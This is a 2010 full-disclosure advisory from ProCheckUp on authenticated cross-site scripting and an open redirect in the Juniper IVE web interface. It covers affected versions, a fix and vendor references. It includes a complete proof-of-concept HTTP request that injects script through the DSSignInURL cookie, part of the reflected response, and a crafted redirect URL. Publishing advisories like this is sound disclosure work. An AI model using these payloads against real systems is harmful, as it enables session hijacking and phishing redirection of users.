
Date: Thu, 10 Jun 2010 09:33:41 +0100
From: research <research@...checkup.com>
To: <vuln@...unia.com>, <full-disclosure@...ts.grok.org.uk>,
	<bugtraq@...urityfocus.com>, <news@...uriteam.com>
Subject: PR09-17: Juniper Secure Access seriers (Juniper
 IVE) authenticated XSS & REDIRECTION

PR09-17: Juniper Secure Access series (Juniper IVE) authenticated XSS &
REDIRECTION

http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr09-17

Vulnerability found: 12th October 2009

Vendor informed: 12 October 2009

Severity: Medium (Script injection)

Description:

There are multiple authenticated Cross-site Scripting vulnerability on
Junipers, IVE web interface.

Procheckup has found by making a malformed authenticated request to the
IVE Web interface, that vanilla cross site scripting (XSS) attacks are
possible.


Successfully tested on:
Juniper Networks IVE
version 6.5R1 (Build 14599)
version 6.5R2 (Build 14951)

Model SA-2000

Proof of concepts:
1) The configuration program is vulnerable to a GET cookie XSS attack

GET /dana/nc/ncrun.cgi?launch_nc=1 HTTP/1.1
Host: 10.0.5.23
Accept: */*
Accept-Language: en
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
Connection: close
Referer: https://10.0.5.23/dana/home/index.cgi
Cookie: DSPREAUTH=; DSFirstAccess=1255332662; DSHCSTARTED=x;
DSASSERTREF=x; DSLastAccess=1255332662; lastRealm=Users;
DSSignInURL=/e6cf2"><script>alert(1)</script>81d17f3a375;
DSSIGNIN=url_default; DSOSMLOGIN=x; DSIVS=; DSCheckBrowser=x;
DSID=5beee6a236f28b2c3ccf14d56b34feba; DSLaunchURL=x;
DSBrowserProxy=127.0.0.1%3A8080;

RESULTS (PART OF)
<PARAM NAME="AutoStart" VALUE="false"><param name="locale" value="en">
<param name="upgradeMode" value="">
<param name="Parameter0"
value="cert_md5=8ae8f59ab11a2e6f43b383876d270799;dns-suffix=procheckup.com;switch-dns-search-order=disabled;internal-proxy-config=no;ncp_read_timeout=90;enable_logging=0;enable_logupload=0;win_start_script=;win_end_script=;win_skip_start_script=0;linux_start_script=;linux_end_script=;mac_start_script=;mac_end_script=;signin_url=/e6cf2"><script>alert(1)</script>81d17f3a375;fips_mode=0">
<param name="Parameter1" value="split-tunneling-routes=">
<param name="Parameter2" value="split-tunneling-mode=1">
<param name="Parameter3" value="nc_auto_uninstall_mode=0">



2) REDIRECTION
https://target-domain.foo/dana/home/homepage.cgi?syncFlag=1&name=test&url=555-555-0199@example.com&chkFavorite=on&chkNewWindow=on&chkAddressBar=on&Location=http://www.procheckup.com&chkToolbar=on&cancel=Cancel


Consequences:

An attacker may be able to cause execution of malicious scripting code
in the browser of a user who clicks on a link or visits a malicious
webpage. The malicious code would run in the security context of the
vulnerable website.

This type of attack can result in non-persistent defacement of the
target site, or the redirection of confidential information (i.e.:
passwords or session IDs) to unauthorised third parties.


Fix:

Update to version 6.5R3.1 (build 15255) or a later version.

References:
http://www.juniper.net/alerts/viewalert.jsp?actionBtn=Search&txtAlertNumber=PSN-2010-05-751&viewMode=view


Credits: Richard Brain of ProCheckUp Ltd (www.procheckup.com)


Legal:

Copyright 2009 Procheckup Ltd. All rights reserved.

Permission is granted for copying and circulating this Bulletin to the
Internet community for the purpose of alerting them to
problems, if and only if, the Bulletin is not edited or changed in any
way, is attributed to Procheckup, and provided such
reproduction and/or distribution is performed for non-commercial purposes.

Any other use of this information is prohibited. Procheckup is not
liable for any misuse of this information by any third party.

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
